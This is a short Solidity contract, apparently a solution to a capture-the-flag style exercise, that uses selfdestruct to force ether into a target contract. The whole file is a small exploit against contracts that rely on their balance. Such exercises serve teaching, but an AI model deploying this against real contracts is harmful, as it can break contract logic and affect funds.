// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract ForceHack {

    function send(address cont) public payable {
        selfdestruct(payable(cont));
    }
}
